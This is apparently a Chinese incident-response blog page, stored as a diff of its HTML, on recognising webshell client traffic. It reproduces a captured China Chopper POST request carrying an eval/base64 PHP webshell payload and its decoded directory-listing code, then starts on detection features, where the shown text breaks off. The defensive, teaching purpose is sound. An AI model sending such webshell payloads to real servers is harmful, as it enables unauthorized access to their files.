@@ -1,0 +1,675 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>应急响应之Webshell流量分析 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="常用的WebShell客户端 中国菜刀(使用量最大，适用范围最广的WebShell客户端) 蚁剑(一种常用的WebShell客户端) 冰蝎(流量加密客户端) 哥斯拉 Weevely(kali中的中国菜刀)  C刀 PHP类WebShell链接流量12345678910111213141516171819POST &#x2F;1.php HTTP&#x2F;1.1User-Agent: Java&#x2F;1.8.0_181Ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="应急响应之Webshell流量分析">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/07/05/dd58c5ed/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="常用的WebShell客户端 中国菜刀(使用量最大，适用范围最广的WebShell客户端) 蚁剑(一种常用的WebShell客户端) 冰蝎(流量加密客户端) 哥斯拉 Weevely(kali中的中国菜刀)  C刀 PHP类WebShell链接流量12345678910111213141516171819POST &#x2F;1.php HTTP&#x2F;1.1User-Agent: Java&#x2F;1.8.0_181Ho">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210281051122.png#id=l9ejO&originHeight=478&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210281053493.png#id=V4KmH&originHeight=516&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210282245988.png#id=i4L9A&originHeight=1035&originWidth=1582&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210282248393.png#id=PROlT&originHeight=753&originWidth=1004&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311622361.png#id=Vvymp&originHeight=663&originWidth=1439&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311624106.png#id=FimOM&originHeight=592&originWidth=1502&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311626613.png#id=E3koG&originHeight=684&originWidth=1626&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311627397.png#id=c104O&originHeight=941&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311845307.png#id=EA4PR&originHeight=1043&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312012043.png#id=yrYWz&originHeight=540&originWidth=1887&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312053019.png#id=kvCCD&originHeight=609&originWidth=1777&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311644063.png#id=sp4dp&originHeight=72&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312117323.png#id=MWazf&originHeight=704&originWidth=1802&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312119696.png#id=HGGKL&originHeight=915&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311745329.png#id=W2Vye&originHeight=859&originWidth=849&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312129735.png#id=izP5J&originHeight=1015&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211012250830.png#id=lLLIj&originHeight=692&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020734219.png#id=BCauv&originHeight=983&originWidth=1582&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020736429.png#id=rQA67&originHeight=1001&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020736283.png#id=pgE30&originHeight=1001&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020752860.png#id=nJw1P&originHeight=1001&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211021935076.png#id=YK2C4&originHeight=965&originWidth=794&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="article:published_time" content="2024-07-04T19:34:49.000Z">
+<meta property="article:modified_time" content="2024-07-25T16:30:42.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="流量分析">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210281051122.png#id=l9ejO&originHeight=478&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+  
+  
+  
+  <meta name="keywords" content="应急响应,流量分析">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：EmergencyResponse</span></div><div class="widget-body"><a class="item" href="/2024/07/03/ac635236/"><span class="title">应急响应-从攻击谈防守</span></a><a class="item" href="/2024/07/04/dd58c5ed/"><span class="title">应急响应之Wireshark流量分析</span></a><a class="item active" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2024/07/06/9e820566/"><span class="title">应急响应之日志分析</span></a><a class="item" href="/2024/07/07/4677b70c/"><span class="title">应急响应之Splunk</span></a><a class="item" href="/2024/07/08/b7b8d727/"><span class="title">应急响应之Windows</span></a><a class="item" href="/2024/07/09/69563a36/"><span class="title">应急响应靶机训练-Web1</span></a><a class="item" href="/2024/07/10/f05f6b8c/"><span class="title">应急响应靶机训练-Web2</span></a><a class="item" href="/2024/07/11/87585b1a/"><span class="title">应急响应靶机训练-Web3</span></a><a class="item" href="/2024/07/12/b7b8d727/"><span class="title">应急响应之Linux</span></a><a class="item" href="/2024/07/16/29554557/"><span class="title">应急响应靶机训练-Linux1</span></a><a class="item" href="/2024/07/17/b05c14ed/"><span class="title">应急响应靶机训练-Linux2</span></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/07/12/b7b8d727/"><span class="title">应急响应之Linux</span></a><a class="item title" href="/2024/07/11/87585b1a/"><span class="title">应急响应靶机训练-Web3</span></a><a class="item title" href="/2024/07/10/f05f6b8c/"><span class="title">应急响应靶机训练-Web2</span></a><a class="item title" href="/2024/07/09/69563a36/"><span class="title">应急响应靶机训练-Web1</span></a><a class="item title" href="/2024/07/08/b7b8d727/"><span class="title">应急响应之Windows</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/07/03/ac635236/">EmergencyResponse</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-04T19:34:49.000Z">2024-07-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-25T16:30:42.000Z">2024-07-26</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>应急响应之Webshell流量分析</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="常用的WebShell客户端"><a href="#常用的WebShell客户端" class="headerlink" title="常用的WebShell客户端"></a>常用的WebShell客户端</h2><ol>
+<li>中国菜刀(使用量最大，适用范围最广的WebShell客户端)</li>
+<li>蚁剑(一种常用的WebShell客户端)</li>
+<li>冰蝎(流量加密客户端)</li>
+<li>哥斯拉</li>
+<li>Weevely(kali中的中国菜刀)</li>
+</ol>
+<h2 id="C刀"><a href="#C刀" class="headerlink" title="C刀"></a>C刀</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210281051122.png#id=l9ejO&originHeight=478&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<h3 id="PHP类WebShell链接流量"><a href="#PHP类WebShell链接流量" class="headerlink" title="PHP类WebShell链接流量"></a>PHP类WebShell链接流量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">User-Agent: Java/1.8.0_181</span><br><span class="line">Host: 192.168.232.130</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-<span class="built_in">type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 735</span><br><span class="line"></span><br><span class="line">nima=@<span class="built_in">eval</span>.(base64_decode(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=Yzpcd3d3cm9vdFwxOTIuMTY4LjIzMi4xMzA%3D</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行URL解码后</span></span><br><span class="line">@<span class="built_in">eval</span>.(base64_decode(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=Yzpcd3d3cm9vdFwxOTIuMTY4LjIzMi4xMzA=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次进行Base64_encode</span></span><br><span class="line"></span><br><span class="line">action=@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(0);@set_magic_quotes_runtime(0);<span class="built_in">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;<span class="variable">$D</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);<span class="variable">$F</span>=@opendir(<span class="variable">$D</span>);<span class="keyword">if</span>(<span class="variable">$F</span>==NULL)&#123;<span class="built_in">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$M</span>=NULL;<span class="variable">$L</span>=NULL;<span class="keyword">while</span>(<span class="variable">$N</span>=@readdir(<span class="variable">$F</span>))&#123;<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$N</span>;<span class="variable">$T</span>=@<span class="built_in">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime(<span class="variable">$P</span>));@<span class="variable">$E</span>=substr(base_convert(@fileperms(<span class="variable">$P</span>),10,8),-4);<span class="variable">$R</span>=<span class="string">&quot;\t&quot;</span>.<span class="variable">$T</span>.<span class="string">&quot;\t&quot;</span>.@filesize(<span class="variable">$P</span>).<span class="string">&quot;\t&quot;</span>.<span class="variable">$E</span>.<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;<span class="keyword">if</span>(@is_dir(<span class="variable">$P</span>))<span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$R</span>;<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;&#125;<span class="built_in">echo</span> <span class="variable">$M</span>.<span class="variable">$L</span>;@closedir(<span class="variable">$F</span>);&#125;;<span class="built_in">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);die();</span><br><span class="line"></span><br><span class="line">z1=c:\wwwroot\192.168.232.130</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210281053493.png#id=V4KmH&originHeight=516&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><strong>其中特征点有如下三部分</strong></p>
+<ol>
+<li>“eval”,eval函数用于执行传递的攻击payload，这是必不可少的； </li>
